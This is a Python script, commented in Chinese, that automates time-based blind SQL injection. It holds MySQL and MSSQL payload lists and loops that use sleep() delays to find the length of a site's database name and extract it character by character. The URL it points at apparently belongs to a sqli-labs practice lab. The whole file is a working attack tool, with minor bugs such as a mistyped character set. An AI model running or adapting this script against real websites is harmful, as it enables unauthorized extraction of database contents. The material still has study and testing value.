# GET型
# Mysql延时注入
import requests
from termcolor import cprint
import time

blind_mysql_payloads = [" and sleep( if( (select length(database()) >0) , 5, 0 ) )",
                        " and If(ascii(substr(database(),1,1))=115,1,sleep(5))",
                        " or sleep(ord(substr(password,1,1)))"
                        ]
blind_mssql_payloads = [" or 51 = '49'; WAITFOR DELAY '0:0:5'",
                        " AND SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables > 'A'",
                        " if 1=1 waitfor delay '0:0:5' else waitfor delay '0:0:0'"
                        ]

class blind_Inject:

    command = 'database'

    def __init__(self, url):
        self.url = url
        self.Notes = ['--+', '-- ', '%23']  # 注释符

    def reqTime(self, url, data=None, timeout=5):         # 请求时间
        if data == None:
            start_time = time.time()
            try:
                requests.get(url)
                # 得返回客户端的时间  假如大于或者等于设置的时间 那就返回true
                sleep_time = time.time() - start_time
                cprint(' [{}]'.format(sleep_time), 'cyan')
                if sleep_time >= timeout:
                    return True
                else:
                    return False
            except Exception as e:
                cprint('message:error', 'yellow')
                return False

    def getData(self, url, length):                   # 获取内容
        data = ""
        char_payloads = 'abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_.'           # 所有字符
        for i in range(1,length+1):
            for char in char_payloads:
                data_payload = 'and If(ascii(substr({}(),{},1))={},sleep(5),1)--+'.format(self.command, i, ord(char))
                payload = url + data_payload
                cprint('[{}==>{}] 测试 ：{}'.format(i, char, payload), 'yellow', end='')
                #expstr = "%20and%20"+"if(ascii(substring(database(),%s,1))=%s,sleep(5),0)" % (j,ord(x))
                #cprint("{} =====> {}".format(i,char), 'yellow')
                if self.reqTime(payload) == True:
                    data += char
                    cprint('{} : {}'.format(self.command, data), 'red')
                    break
        return data

    def getLength(self, url):        # command可以是user也可以是database
        i = 1
        while True:
            length_payload = " and sleep( if( (select length({}()) = {}) , 5, 0 ) )--+".format(self.command, i)     # 长度payload
            payload = url + length_payload
            print('[{}] 测试 ：{}'.format(i, payload), end='')
            if self.reqTime(payload) == True:
                cprint('[+]延时注入！ {} 的长度为： {}'.format(self.command, i), 'red')
                return i
            i = i + 1

    def attack(self):
        data_length = self.getLength(url)
        self.getData(url, data_length)


    #url = "http://demo.sqli.com/Less-9/?id=1'"
url = 'http://demo.sqli.com/Less-10/?id=1"'

blind_Inject(url).attack()